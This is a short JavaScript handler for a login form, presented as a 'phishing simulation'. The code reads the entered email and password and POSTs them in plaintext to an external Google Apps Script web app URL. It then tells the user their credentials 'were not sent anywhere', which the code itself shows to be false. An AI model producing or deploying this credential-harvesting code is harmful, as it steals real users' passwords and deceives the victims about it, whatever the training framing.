document.getElementById('loginForm').addEventListener('submit', function(e) {
e.preventDefault(); // Stop the form from doing its default submit

const email = document.getElementById('email').value;
const password = document.getElementById('password').value;

// --- THIS IS THE IMPORTANT PART ---
// Paste your Web App URL inside the quotes below.
const webhookUrl = 'https://script.google.com/macros/s/AKfycbyXOLDwkcGTwAUbDTKPYCnQjUY6Svjs9kF2oqOlKgpc94XN1OSuecgQnmEdJ9cK-bCB/exec';

// Prepare the data to be sent
const data = {
email: email,
password: password
};

// Send the data to your Google Apps Script
fetch(webhookUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json'
},
body: JSON.stringify(data)
})
.then(response => response.json())
.then(result => {
// After the data is successfully sent, show the alert and redirect.
alert('This was a phishing simulation. Your credentials were not sent anywhere.');
// You can redirect them to a training page here if you want.
// window.location.href = 'https://example.com/phishing-education';
})
.catch(error => {
console.error('Error:', error);
// Still show the alert even if logging fails, so the user experience is the same.
alert('This was a phishing simulation. Your credentials were not sent anywhere.');
});
});
